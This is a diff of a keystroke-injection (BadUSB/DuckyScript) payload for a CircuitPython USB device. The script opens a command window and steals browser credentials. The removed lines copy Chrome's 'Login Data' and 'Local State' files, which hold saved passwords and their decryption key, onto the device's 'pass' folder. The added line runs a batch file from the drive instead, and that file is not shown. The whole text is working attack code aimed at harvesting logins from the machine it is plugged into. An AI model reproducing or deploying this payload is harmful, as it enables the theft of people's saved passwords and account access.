@@ -2,7 +2,7 @@ DEFAULTDELAY 10
 DELAY 5000
 GUI r
 DELAY 250
-STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+STRING cmd /Q /D /F:OFF /V:ON /K
 ENTER
 DELAY 2500
 REM get the path for the circuitpy 
@@ -34,11 +34,6 @@ STRING :break
 ENTER
 STRING set rand=%RANDOM%
 ENTER
-STRING copy %LOCALAPPDATA%\Google\Chrome\"User Data"\Default\"Login Data" %CIRCUITPYdrive%\pass\LoginData%rand% ;
+STRING cmd /c "%CIRCUITPYdrive%\copyScript.bat"
 ENTER
-STRING copy %LOCALAPPDATA%\Google\Chrome\"User Data"\"Local State" %CIRCUITPYdrive%\pass\LocalState%rand% ;
-ENTER
-DELAY 5000
-ENTER
-STRING exit
-ENTER
+DELAY 100000
